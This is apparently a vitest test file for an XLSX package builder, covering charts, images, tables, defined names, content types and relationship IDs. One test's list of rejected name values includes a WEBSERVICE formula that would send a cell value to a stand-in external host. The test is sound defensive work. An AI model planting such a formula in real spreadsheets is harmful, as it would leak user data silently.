import { describe, expect, it } from "vitest";
import type {
  ContentDefinedName,
  ContentDocument,
  ContentEmbeddedObject,
  ContentSheet,
  DefinitionsTable,
} from "document-schema.js";
import { PAGE_SIZE_A4, PAGE_SIZE_LETTER } from "document-schema.js";
import { attr, childrenWithTag, rootElement, textContent } from "../util";
import { buildXlsxPackageFromContent } from "./build";
import { readXlsxContent } from "./content";
import { readWorkbookDefinitions } from "./definitions";
const DEDUPED_STRING_CELL_ROW = 5;

const KITCHEN_SINK_SHEET: ContentSheet = {
  name: "Data",
  cells: [
    {
      row: 0,
      column: 0,
      value: { kind: "string", value: "Name" },
      displayText: "Name",
    },
    {
      row: 0,
      column: 1,
      value: { kind: "string", value: "Amount" },
      displayText: "Amount",
    },
    {
      row: 1,
      column: 0,
      value: { kind: "string", value: "Acme Corp" },
      displayText: "Acme Corp",
    },
    {
      row: 1,
      column: 1,
      value: { kind: "number", value: 1234.56 },
      displayText: "1234.56",
    },
    {
      row: 2,
      column: 0,
      value: { kind: "boolean", value: true },
      displayText: "TRUE",
    },
    {
      row: 3,
      column: 0,
      value: { kind: "number", value: 3 },
      formula: "SUM(B2:B3)",
      displayText: "3",
    },
    {
      row: 4,
      column: 0,
      value: { kind: "error", value: "#DIV/0!" },
      formula: "1/0",
      displayText: "#DIV/0!",
    },
    // A repeated text value — exercises shared-string deduplication (both cells must intern to the SAME index).
    {
      row: 5,
      column: 0,
      value: { kind: "string", value: "Acme Corp" },
      displayText: "Acme Corp",
    },
    // The anchor of a 2x2 merge.
    {
      row: 6,
      column: 0,
      value: { kind: "string", value: "Merged Cell" },
      displayText: "Merged Cell",
      colSpan: 2,
      rowSpan: 2,
    },
    // A cell containing text that needs XML escaping.
    {
      row: 8,
      column: 0,
      value: { kind: "string", value: "Tom & Jerry <b>" },
      displayText: "Tom & Jerry <b>",
    },
  ],
  columns: [
    { index: 0, widthPt: 100 },
    { index: 1, widthPt: 60, hidden: true },
  ],
  rows: [
    { index: 0, heightPt: 20 },
    { index: 9, heightPt: 15, hidden: true },
  ],
  images: [],
  printSettings: {
    pageSize: PAGE_SIZE_A4,
    margins: { topPt: 54, rightPt: 50.4, bottomPt: 54, leftPt: 50.4 },
    printRange: { startRow: 0, startColumn: 0, endRow: 9, endColumn: 1 },
    scalePercent: 125,
    repeatRows: { start: 0, end: 0 },
    repeatColumns: { start: 0, end: 0 },
    gridlines: true,
    headers: true,
    pageOrder: "overThenDown",
    manualBreaks: { rows: [DEDUPED_STRING_CELL_ROW], columns: [1] },
  },
};

const SUMMARY_SHEET: ContentSheet = {
  name: "Summary",
  cells: [
    {
      row: 0,
      column: 0,
      value: { kind: "number", value: 42 },
      displayText: "42",
    },
  ],
  columns: [],
  rows: [],
  images: [],
  printSettings: {
    pageSize: PAGE_SIZE_LETTER,
    margins: { topPt: 72, rightPt: 72, bottomPt: 72, leftPt: 72 },
    fitToPages: { width: 1, height: 3 },
    gridlines: false,
    headers: false,
    pageOrder: "downThenOver",
  },
};

const DOCUMENT: ContentDocument = {
  kind: "spreadsheet",
  metadata: {
    title: "Kitchen Sink",
    author: "Test Suite",
    keywords: ["a", "b"],
    createdIso: "2026-07-31T00:00:00Z",
  },
  sheets: [KITCHEN_SINK_SHEET, SUMMARY_SHEET],
};

const DEFAULT_PRINT_SETTINGS: ContentSheet["printSettings"] = {
  pageSize: PAGE_SIZE_LETTER,
  margins: { topPt: 72, rightPt: 72, bottomPt: 72, leftPt: 72 },
  gridlines: false,
  headers: false,
  pageOrder: "downThenOver",
};

function singleSheetDocument(cells: ContentSheet["cells"]): ContentDocument {
  return {
    kind: "spreadsheet",
    metadata: {},
    sheets: [
      {
        name: "Sheet1",
        cells,
        columns: [],
        rows: [],
        images: [],
        printSettings: DEFAULT_PRINT_SETTINGS,
      },
    ],
  };
}

function chartEmbeddedObject(): ContentEmbeddedObject {
  return {
    objectKind: "chart",
    frame: { xPt: 10, yPt: 15, widthPt: 200, heightPt: 120 },
    anchorRow: 1,
    anchorColumn: 0,
    offsetXPt: 0,
    offsetYPt: 0,
    document: {
      kind: "spreadsheet",
      metadata: {},
      sheets: [
        {
          name: "Chart 1",
          cells: [
            {
              row: 0,
              column: 1,
              value: { kind: "string", value: "Revenue" },
              displayText: "Revenue",
            },
            {
              row: 1,
              column: 0,
              value: { kind: "string", value: "Q1" },
              displayText: "Q1",
            },
            {
              row: 1,
              column: 1,
              value: { kind: "string", value: "8.5" },
              displayText: "8.5",
            },
            {
              row: 2,
              column: 0,
              value: { kind: "string", value: "Q2" },
              displayText: "Q2",
            },
            {
              row: 2,
              column: 1,
              value: { kind: "string", value: "12" },
              displayText: "12",
            },
          ],
          columns: [],
          rows: [],
          images: [],
          printSettings: DEFAULT_PRINT_SETTINGS,
        },
      ],
    },
  };
}

const TINY_PNG_BASE64 =
  "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=";

function tableDefinitions(): DefinitionsTable {
  return {
    "table:SalesTable": {
      kind: "table",
      name: "SalesTable",
      ref: "A1:B3",
      sheet: "Sheet1",
      columns: ["Item", "Amount"],
    },
  };
}

describe("buildXlsxPackageFromContent: drawing layer (charts and pictures)", () => {
  it("writes a real xl/drawings/drawingN.xml plus xl/charts/chartN.xml for a chart embedded object, and reading it back recovers the same series/category cache", () => {
    const sourceChart = chartEmbeddedObject();
    const sourceChartSheet =
      sourceChart.document.kind === "spreadsheet"
        ? sourceChart.document.sheets[0]
        : undefined;
    const document: ContentDocument = {
      kind: "spreadsheet",
      metadata: {},
      sheets: [
        {
          name: "Sheet1",
          cells: [],
          columns: [],
          rows: [],
          images: [],
          embeddedObjects: [sourceChart],
          printSettings: DEFAULT_PRINT_SETTINGS,
        },
      ],
    };
    const pkg = buildXlsxPackageFromContent(document);
    expect(Object.keys(pkg.parts)).toContain("xl/drawings/drawing1.xml");
    expect(Object.keys(pkg.parts)).toContain("xl/charts/chart1.xml");
    const contentTypes = rootElement(pkg.parts["[Content_Types].xml"]);
    if (contentTypes === undefined) {
      throw new Error("expected [Content_Types].xml to have a root element");
    }
    const overrides = childrenWithTag(contentTypes, "Override").map((el) =>
      attr(el, "PartName"),
    );
    expect(overrides).toContain("/xl/drawings/drawing1.xml");
    expect(overrides).toContain("/xl/charts/chart1.xml");

    const roundTripped = readXlsxContent(pkg);
    if (roundTripped.kind !== "spreadsheet") {
      throw new Error("expected a spreadsheet ContentDocument");
    }
    const chart = roundTripped.sheets[0]?.embeddedObjects?.[0];
    expect(chart?.objectKind).toBe("chart");
    const chartSheet =
      chart?.document.kind === "spreadsheet"
        ? chart.document.sheets[0]
        : undefined;
    expect(chartSheet?.cells).toEqual(sourceChartSheet?.cells);
  });

  it("writes a real xl/drawings/drawingN.xml plus xl/media/imageN.png for a sheet image, and reading it back recovers the same bytes", () => {
    // Arbitrary but distinct fixture dimensions, reused below when checking the round-tripped size survives the EMU conversion.
    const IMAGE_WIDTH_PT = 100;
    const IMAGE_HEIGHT_PT = 50;
    const document: ContentDocument = {
      kind: "spreadsheet",
      metadata: {},
      sheets: [
        {
          name: "Sheet1",
          cells: [],
          columns: [],
          rows: [],
          images: [
            {
              kind: "image",
              format: "png",
              base64: TINY_PNG_BASE64,
              widthPt: IMAGE_WIDTH_PT,
              heightPt: IMAGE_HEIGHT_PT,
              anchorRow: 0,
              anchorColumn: 0,
              offsetXPt: 0,
              offsetYPt: 0,
            },
          ],
          printSettings: DEFAULT_PRINT_SETTINGS,
        },
      ],
    };
    const pkg = buildXlsxPackageFromContent(document);
    expect(Object.keys(pkg.parts)).toContain("xl/media/image1.png");
    const roundTripped = readXlsxContent(pkg);
    if (roundTripped.kind !== "spreadsheet") {
      throw new Error("expected a spreadsheet ContentDocument");
    }
    const image = roundTripped.sheets[0]?.images[0];
    expect(image?.format).toBe("png");
    expect(image?.base64).toBe(TINY_PNG_BASE64);
    // The pt -> EMU -> pt round trip isn't exact, so this checks closeness rather than equality.
    const ROUND_TRIP_PRECISION_DIGITS = 5;
    expect(image?.widthPt).toBeCloseTo(
      IMAGE_WIDTH_PT,
      ROUND_TRIP_PRECISION_DIGITS,
    );
    expect(image?.heightPt).toBeCloseTo(
      IMAGE_HEIGHT_PT,
      ROUND_TRIP_PRECISION_DIGITS,
    );
  });

  it("writes no drawing part, no worksheet rels, and no Content_Types override at all for a sheet carrying neither an image nor a chart", () => {
    const pkg = buildXlsxPackageFromContent(singleSheetDocument([]));
    expect(Object.keys(pkg.parts)).not.toContain("xl/drawings/drawing1.xml");
    expect(Object.keys(pkg.parts)).not.toContain(
      "xl/worksheets/_rels/sheet1.xml.rels",
    );
  });
});

describe("buildXlsxPackageFromContent: the definitions option (Table objects) and the document's own names", () => {
  it("writes a real xl/tables/tableN.xml plus a worksheet tableParts entry for a table definitions entry, and reading it back through readWorkbookDefinitions recovers the same entry", () => {
    const pkg = buildXlsxPackageFromContent(singleSheetDocument([]), {
      definitions: tableDefinitions(),
    });
    expect(Object.keys(pkg.parts)).toContain("xl/tables/table1.xml");
    const worksheet = rootElement(pkg.parts["xl/worksheets/sheet1.xml"]);
    if (worksheet === undefined) {
      throw new Error("expected the worksheet part to have a root element");
    }
    const tableParts = childrenWithTag(worksheet, "tableParts")[0];
    if (tableParts === undefined) {
      throw new Error("expected the worksheet to carry a tableParts element");
    }
    expect(childrenWithTag(tableParts, "tablePart")).toHaveLength(1);

    expect(readWorkbookDefinitions(pkg)).toEqual(tableDefinitions());
  });

  it("writes a real general <definedName> for a names entry, and reading it back through the flat reader recovers the same entry verbatim", () => {
    const wide = singleSheetDocument([]);
    if (wide.kind !== "spreadsheet") {
      throw new Error("expected a spreadsheet ContentDocument");
    }
    wide.names = [{ name: "TaxRate", refersTo: "Sheet1!$B$1" }];
    const pkg = buildXlsxPackageFromContent(wide);
    const workbook = rootElement(pkg.parts["xl/workbook.xml"]);
    if (workbook === undefined) {
      throw new Error("expected xl/workbook.xml to have a root element");
    }
    const definedNames = childrenWithTag(workbook, "definedNames")[0];
    if (definedNames === undefined) {
      throw new Error("expected a <definedNames> container");
    }
    const definedName = childrenWithTag(definedNames, "definedName").find(
      (element) => attr(element, "name") === "TaxRate",
    );
    expect(definedName).toBeDefined();
    if (definedName !== undefined) {
      expect(textContent(definedName)).toBe("Sheet1!$B$1");
    }

    const reread = readXlsxContent(pkg);
    if (reread.kind !== "spreadsheet") {
      throw new Error("expected a spreadsheet ContentDocument");
    }
    expect(reread.names).toEqual([
      { name: "TaxRate", refersTo: "Sheet1!$B$1" },
    ]);
  });

  it("writes scopeSheetIndex back as localSheetId, recovering the same sheet-scoped name", () => {
    const wide = singleSheetDocument([]);
    if (wide.kind !== "spreadsheet") {
      throw new Error("expected a spreadsheet ContentDocument");
    }
    wide.names = [
      { name: "ReportTitle", refersTo: "Sheet1!$A$1", scopeSheetIndex: 0 },
    ];
    const reread = readXlsxContent(buildXlsxPackageFromContent(wide));
    if (reread.kind !== "spreadsheet") {
      throw new Error("expected a spreadsheet ContentDocument");
    }
    expect(reread.names).toEqual([
      { name: "ReportTitle", refersTo: "Sheet1!$A$1", scopeSheetIndex: 0 },
    ]);
  });

  it("writes sheet-quoted ranges, unions, column ranges, and row ranges as names, and recovers each through the flat reader", () => {
    const names: ContentDefinedName[] = [
      { name: "Quoted", refersTo: "'Q1 Summary'!$A$1:$C$3" },
      { name: "Union", refersTo: "Sheet1!$A$1:$A$9,Sheet1!$C$1:$C$9" },
      { name: "Columns", refersTo: "Sheet1!$A:$C" },
      { name: "Rows", refersTo: "Sheet1!$1:$3" },
    ];
    const wide = singleSheetDocument([]);
    if (wide.kind !== "spreadsheet") {
      throw new Error("expected a spreadsheet ContentDocument");
    }
    wide.names = names;
    const reread = readXlsxContent(buildXlsxPackageFromContent(wide));
    if (reread.kind !== "spreadsheet") {
      throw new Error("expected a spreadsheet ContentDocument");
    }
    expect(reread.names).toEqual(names);
  });

  it("refuses a name whose refersTo carries formula or external-reference content, by name", () => {
    const refused: readonly string[] = [
      'Sheet1!$A$1&WEBSERVICE("http://example.invalid/"&A1)',
      "SUM(Sheet1!$A$1:$A$9)",
      "[1]Sheet1!$A$1",
      "Sheet1!$A$1:INDEX($A:$A,9)",
      "$A$1:$B$2",
      "=Sheet1!$A$1",
      "#REF!",
    ];
    for (const refersTo of refused) {
      const wide = singleSheetDocument([]);
      if (wide.kind !== "spreadsheet") {
        throw new Error("expected a spreadsheet ContentDocument");
      }
      wide.names = [{ name: "Danger", refersTo }];
      expect(() => buildXlsxPackageFromContent(wide)).toThrow(
        /sheet-qualified internal A1 reference/,
      );
    }
  });

  it("writes a names entry's own print built-in VERBATIM, deriving one from print settings only when the array does not already carry it", () => {
    const wide = singleSheetDocument([]);
    if (wide.kind !== "spreadsheet") {
      throw new Error("expected a spreadsheet ContentDocument");
    }
    const sheet = wide.sheets[0];
    if (sheet === undefined) {
      throw new Error("expected a sheet at index 0");
    }
    sheet.printSettings = {
      ...sheet.printSettings,
      printRange: { startRow: 0, startColumn: 0, endRow: 9, endColumn: 1 },
    };
    wide.names = [
      // The names array's own refersTo is the higher-fidelity spelling — the derived Print_Area for sheet 0 must not duplicate or replace it.
      {
        name: "_xlnm.Print_Area",
        refersTo: "Sheet1!$A$1:$B$10,Sheet1!$D$1:$E$5",
        scopeSheetIndex: 0,
      },
      { name: "TaxRate", refersTo: "Sheet1!$B$1" },
    ];
    const pkg = buildXlsxPackageFromContent(wide);
    const workbook = rootElement(pkg.parts["xl/workbook.xml"]);
    if (workbook === undefined) {
      throw new Error("expected xl/workbook.xml to have a root element");
    }
    const definedNames = childrenWithTag(workbook, "definedNames")[0];
    if (definedNames === undefined) {
      throw new Error("expected a <definedNames> container");
    }
    const entries = childrenWithTag(definedNames, "definedName").map(
      (element) => ({
        name: attr(element, "name"),
        localSheetId: attr(element, "localSheetId"),
        refersTo: textContent(element),
      }),
    );
    expect(entries).toEqual([
      {
        name: "_xlnm.Print_Area",
        localSheetId: "0",
        refersTo: "Sheet1!$A$1:$B$10,Sheet1!$D$1:$E$5",
      },
      { name: "TaxRate", localSheetId: undefined, refersTo: "Sheet1!$B$1" },
    ]);
  });

  it("derives the reserved print names from structured print settings when the names array carries none", () => {
    const wide = singleSheetDocument([]);
    if (wide.kind !== "spreadsheet") {
      throw new Error("expected a spreadsheet ContentDocument");
    }
    const sheet = wide.sheets[0];
    if (sheet === undefined) {
      throw new Error("expected a sheet at index 0");
    }
    sheet.printSettings = {
      ...sheet.printSettings,
      printRange: { startRow: 0, startColumn: 0, endRow: 9, endColumn: 1 },
    };
    const pkg = buildXlsxPackageFromContent(wide);
    const workbook = rootElement(pkg.parts["xl/workbook.xml"]);
    if (workbook === undefined) {
      throw new Error("expected xl/workbook.xml to have a root element");
    }
    const definedNames = childrenWithTag(workbook, "definedNames")[0];
    if (definedNames === undefined) {
      throw new Error("expected a <definedNames> container");
    }
    const entries = childrenWithTag(definedNames, "definedName");
    expect(entries).toHaveLength(1);
    const printArea = entries[0];
    if (printArea === undefined) {
      throw new Error("expected a print-area definedName");
    }
    expect(attr(printArea, "name")).toBe("_xlnm.Print_Area");
    expect(attr(printArea, "localSheetId")).toBe("0");
    expect(textContent(printArea)).toBe("Sheet1!$A$1:$B$10");
  });

  it("writes no <definedNames> container and no xl/tables part at all when no definitions are supplied and the document carries no names", () => {
    const pkg = buildXlsxPackageFromContent(singleSheetDocument([]));
    const workbook = rootElement(pkg.parts["xl/workbook.xml"]);
    if (workbook === undefined) {
      throw new Error("expected xl/workbook.xml to have a root element");
    }
    expect(childrenWithTag(workbook, "definedNames")).toHaveLength(0);
    expect(Object.keys(pkg.parts)).not.toContain("xl/tables/table1.xml");
  });
});

// --- exact scaffolding: the XML declaration, [Content_Types].xml, package/workbook relationships -----------------

describe("buildXlsxPackageFromContent: every XML part carries the same declaration prolog", () => {
  it('declares version="1.0" encoding="UTF-8" standalone="yes" on the [Content_Types].xml part', () => {
    const part = buildXlsxPackageFromContent(singleSheetDocument([])).parts[
      "[Content_Types].xml"
    ];
    if (part?.kind !== "xml") {
      throw new Error("expected an xml part");
    }
    const declaration = part.nodes[0];
    if (declaration?.type !== "declaration") {
      throw new Error("expected a declaration node first");
    }
    const attrOf = (name: string): string | undefined =>
      declaration.attributes.find((a) => a.name === name)?.value;
    expect(attrOf("version")).toBe("1.0");
    expect(attrOf("encoding")).toBe("UTF-8");
    expect(attrOf("standalone")).toBe("yes");
  });
});

describe("buildXlsxPackageFromContent: [Content_Types].xml carries every part's exact Override, for a document exercising every content kind", () => {
  function fullDocument(): ContentDocument {
    const chart = chartEmbeddedObject();
    return {
      kind: "spreadsheet",
      metadata: {},
      sheets: [
        {
          name: "Sheet1",
          cells: [
            {
              row: 0,
              column: 0,
              value: { kind: "string", value: "x" },
              displayText: "x",
              comment: { text: "note" },
            },
          ],
          columns: [],
          rows: [],
          images: [
            {
              kind: "image",
              format: "png",
              base64: TINY_PNG_BASE64,
              widthPt: 10,
              heightPt: 10,
              anchorRow: 0,
              anchorColumn: 0,
              offsetXPt: 0,
              offsetYPt: 0,
            },
          ],
          embeddedObjects: [chart],
          printSettings: DEFAULT_PRINT_SETTINGS,
        },
        {
          name: "Sheet2",
          cells: [],
          columns: [],
          rows: [],
          images: [],
          printSettings: DEFAULT_PRINT_SETTINGS,
        },
      ],
    };
  }

  it("writes the fixed workbook/styles/sharedStrings overrides, one worksheet override per sheet, and the media/comments/drawing/chart/table overrides for the parts a fuller document actually carries", () => {
    const pkg = buildXlsxPackageFromContent(fullDocument(), {
      definitions: tableDefinitions(),
    });
    const contentTypes = rootElement(pkg.parts["[Content_Types].xml"]);
    if (contentTypes === undefined) {
      throw new Error("expected [Content_Types].xml to have a root element");
    }
    const defaults = childrenWithTag(contentTypes, "Default").map((el) => ({
      extension: attr(el, "Extension"),
      contentType: attr(el, "ContentType"),
    }));
    expect(defaults).toContainEqual({
      extension: "rels",
      contentType: "application/vnd.openxmlformats-package.relationships+xml",
    });
    expect(defaults).toContainEqual({
      extension: "xml",
      contentType: "application/xml",
    });
    expect(defaults).toContainEqual({
      extension: "png",
      contentType: "image/png",
    });

    const overrides = childrenWithTag(contentTypes, "Override").map((el) => ({
      partName: attr(el, "PartName"),
      contentType: attr(el, "ContentType"),
    }));
    expect(overrides).toContainEqual({
      partName: "/xl/workbook.xml",
      contentType:
        "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml",
    });
    expect(overrides).toContainEqual({
      partName: "/xl/styles.xml",
      contentType:
        "application/vnd.openxmlformats-officedocument.spreadsheetml.styles+xml",
    });
    expect(overrides).toContainEqual({
      partName: "/xl/sharedStrings.xml",
      contentType:
        "application/vnd.openxmlformats-officedocument.spreadsheetml.sharedStrings+xml",
    });
    // One worksheet override per sheet, not one fewer or one more.
    expect(overrides).toContainEqual({
      partName: "/xl/worksheets/sheet1.xml",
      contentType:
        "application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml",
    });
    expect(overrides).toContainEqual({
      partName: "/xl/worksheets/sheet2.xml",
      contentType:
        "application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml",
    });
    expect(
      overrides.filter(
        (o) => o.partName?.startsWith("/xl/worksheets/sheet") === true,
      ),
    ).toHaveLength(2);
    // Only sheet 1 carries a comment, a drawing, and a table — indices must not leak onto sheet 2.
    expect(overrides).toContainEqual({
      partName: "/xl/threadedComments/threadedComment1.xml",
      contentType: "application/vnd.ms-excel.threadedcomments+xml",
    });
    expect(overrides).not.toContainEqual(
      expect.objectContaining({
        partName: "/xl/threadedComments/threadedComment2.xml",
      }),
    );
    expect(overrides).toContainEqual({
      partName: "/xl/drawings/drawing1.xml",
      contentType: "application/vnd.openxmlformats-officedocument.drawing+xml",
    });
    expect(overrides).not.toContainEqual(
      expect.objectContaining({ partName: "/xl/drawings/drawing2.xml" }),
    );
    expect(overrides).toContainEqual({
      partName: "/xl/charts/chart1.xml",
      contentType:
        "application/vnd.openxmlformats-officedocument.drawingml.chart+xml",
    });
    expect(overrides).toContainEqual({
      partName: "/xl/tables/table1.xml",
      contentType:
        "application/vnd.openxmlformats-officedocument.spreadsheetml.table+xml",
    });
    expect(overrides).toContainEqual({
      partName: "/docProps/core.xml",
      contentType: "application/vnd.openxmlformats-package.core-properties+xml",
    });
    expect(overrides).toContainEqual({
      partName: "/docProps/app.xml",
      contentType:
        "application/vnd.openxmlformats-officedocument.extended-properties+xml",
    });
  });

  it("declares no jpeg/gif media default when only a png is actually used", () => {
    const pkg = buildXlsxPackageFromContent(fullDocument());
    const contentTypes = rootElement(pkg.parts["[Content_Types].xml"]);
    if (contentTypes === undefined) {
      throw new Error("expected [Content_Types].xml to have a root element");
    }
    const extensions = childrenWithTag(contentTypes, "Default").map((el) =>
      attr(el, "Extension"),
    );
    expect(extensions).not.toContain("jpeg");
    expect(extensions).not.toContain("gif");
  });
});

describe("buildXlsxPackageFromContent: _rels/.rels carries exactly the three fixed package relationships", () => {
  it("writes rId1/rId2/rId3 pointing at the workbook, core properties, and extended properties, in that order", () => {
    const pkg = buildXlsxPackageFromContent(singleSheetDocument([]));
    const rels = rootElement(pkg.parts["_rels/.rels"]);
    if (rels === undefined) {
      throw new Error("expected _rels/.rels to have a root element");
    }
    const relationships = childrenWithTag(rels, "Relationship").map((el) => ({
      id: attr(el, "Id"),
      type: attr(el, "Type"),
      target: attr(el, "Target"),
    }));
    expect(relationships).toEqual([
      {
        id: "rId1",
        type: "http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument",
        target: "xl/workbook.xml",
      },
      {
        id: "rId2",
        type: "http://schemas.openxmlformats.org/package/2006/relationships/metadata/core-properties",
        target: "docProps/core.xml",
      },
      {
        id: "rId3",
        type: "http://schemas.openxmlformats.org/officeDocument/2006/relationships/extended-properties",
        target: "docProps/app.xml",
      },
    ]);
  });
});

describe("buildXlsxPackageFromContent: xl/_rels/workbook.xml.rels numbers worksheet relationships before styles/sharedStrings, exactly one id past the sheet count", () => {
  it("writes one worksheet relationship per sheet (rId1..rIdN), then styles at rId(N+1) and sharedStrings at rId(N+2), for a 2-sheet workbook", () => {
    const pkg = buildXlsxPackageFromContent(DOCUMENT);
    const rels = rootElement(pkg.parts["xl/_rels/workbook.xml.rels"]);
    if (rels === undefined) {
      throw new Error(
        "expected xl/_rels/workbook.xml.rels to have a root element",
      );
    }
    const relationships = childrenWithTag(rels, "Relationship").map((el) => ({
      id: attr(el, "Id"),
      type: attr(el, "Type"),
      target: attr(el, "Target"),
    }));
    expect(relationships).toEqual([
      {
        id: "rId1",
        type: "http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet",
        target: "worksheets/sheet1.xml",
      },
      {
        id: "rId2",
        type: "http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet",
        target: "worksheets/sheet2.xml",
      },
      {
        id: "rId3",
        type: "http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles",
        target: "styles.xml",
      },
      {
        id: "rId4",
        type: "http://schemas.openxmlformats.org/officeDocument/2006/relationships/sharedStrings",
        target: "sharedStrings.xml",
      },
    ]);
  });

  it("writes exactly one worksheet relationship, at rId1, for a single-sheet workbook — proving the loop runs sheetCount times, not one more or fewer", () => {
    const pkg = buildXlsxPackageFromContent(singleSheetDocument([]));
    const rels = rootElement(pkg.parts["xl/_rels/workbook.xml.rels"]);
    if (rels === undefined) {
      throw new Error(
        "expected xl/_rels/workbook.xml.rels to have a root element",
      );
    }
    const worksheetRels = childrenWithTag(rels, "Relationship").filter(
      (el) =>
        attr(el, "Type") ===
        "http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet",
    );
    expect(worksheetRels).toHaveLength(1);
    const [worksheetRel] = worksheetRels;
    if (worksheetRel === undefined) {
      throw new Error("expected exactly one worksheet relationship");
    }
    expect(attr(worksheetRel, "Id")).toBe("rId1");
  });
});
